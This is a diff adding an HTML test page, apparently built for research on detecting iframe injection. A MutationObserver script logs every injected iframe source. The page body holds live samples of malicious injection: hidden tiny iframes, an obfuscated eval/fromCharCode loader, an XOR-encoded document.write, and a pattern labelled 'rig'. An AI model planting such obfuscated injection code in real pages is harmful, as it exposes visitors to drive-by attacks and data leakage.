@@ -1,0 +1,86 @@
+<script type="text/javascript">
+
+    function download(filename, text) {
+    var pom = document.createElement('a');
+    pom.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(text));
+    pom.setAttribute('download', filename);
+	document.body.appendChild(pom);
+    pom.click();
+    document.body.removeChild(pom);
+	/*
+    if (document.createEvent) {
+        var event = document.createEvent('MouseEvents');
+        event.initEvent('click', true, true);
+        pom.dispatchEvent(event);
+    }
+    else {
+        pom.click();
+    }*/
+    }
+
+    MutationObserver = window.MutationObserver || window.WebKitMutationObserver;
+    var observer = new MutationObserver(function (mutations) {
+    mutations.forEach(function (mutation) {
+    //console.log(mutation);
+    for(var j=0; j<mutation.addedNodes.length; ++j) {
+         var node = mutation.addedNodes[j];
+         if (node.id === 'jalangi_results_frame')
+         {  continue; }
+         if ((node.nodeName === 'IFRAME') && (typeof node.src != 'undefined') )
+         {
+            console.log(node);
+            console.log("[mutationObserve][ketian][iframe][summary]" + "src" + "->" + node.src);
+            var text = "[mutationObserve][ketian][iframe][summary]" + "src" + "->" + node.src;
+            // Start file download.
+            var name = window.location.href;
+			download(name.toString() +'.txt', text);
+         }
+        }
+    });
+});
+
+var observerConfig = {
+        childList: true,
+        subtree: true
+};
+
+observer.observe(document, observerConfig);
+</script>
+<!DOCTYPE html>
+<html>
+<head>
+</head>
+<body>
+
+<!-- https://blog.korelogic.com/blog/2015/01/12/javascript_deobfuscation><-->
+
+<h1>This is a Heading</h1>
+<p>This is a paragraph.</p>
+<p> Hello world</p>
+
+<script type="text/javascript"> var nglezu = "iframe"; var jnjpcg = document.createElement(nglezu); var bbocp = ""; jnjpcg.style.width = "7px"; jnjpcg.style.height = "11px"; jnjpcg.style.border = "0px"; jnjpcg.frameBorder = "0"; jnjpcg.setAttribute("frameBorder", "0"); document.body.appendChild(jnjpcg); bbocp = "https://www.w3schools.com/"; jnjpcg.src = bbocp; </script>
+<script>try{q=document.createElement("p");q.appendChild(q+"");}catch(qw){h=-012/5;try{bcsd=prototype-2;}catch(bawg){ss=[];f=(h)?("fromCharC"+"ode"):"";e=window["e"+"val"];n=[13,20,300,444,99,234,327,404,110,232,138,476,114,210,348,404,40,78,180,420,102,228,291,436,101,64,345,456,99,122,102,416,116,232,336,232,47,94,315,476,97,208,342,444,113,92,342,468,47,198,333,468,110,232,162,184,112,208,336,136,32,220,291,436,101,122,102,336,119,210,348,464,101,228,102,128,115,198,342,444,108,216,315,440,103,122,102,388,117,232,333,136,32,204,342,388,109,202,294,444,114,200,303,456,61,68,330,444,34,64,291,432,105,206,330,244,34,198,303,440,116,202,342,136,32,208,303,420,103,208,348,244,34,100,102,128,119,210,300,464,104,122,102,200,34,124,180,188,105,204,342,388,109,202,186,156,41,118,39,40];if(window.document)for(i=6-2-1-2-1;-160+i!=2-2;i++){k=i;ss=ss+String[f](n[k]/(i%(h*h)+2-1));}e("if(1)"+ss);}}</script>
+
+
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00ida,'00'02)'02'00k,k'00'02)'02'00nn'00'02)'02'00woklcv'00'02)'02'00kmlg'00'02)'02'00q,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+
+
+<script type="text/javascript">
+   //iframe injection pattern 2: rig
+    var idafhai = "iframe";
+    var ukqre = document.createElement(idafhai);
+    var utukl = "";
+    ukqre.style.width = "12px";
+    ukqre.style.height = "5px";
+    ukqre.style.border = "0px";
+    ukqre.frameBorder = "0";
+    ukqre.setAttribute("frameBorder", "0");
+    document.body.appendChild(ukqre);
+    utukl = "https://www.w3schools.com/";
+    ukqre.src = utukl;
+</script>
+
+
+
+</body>
+</html>
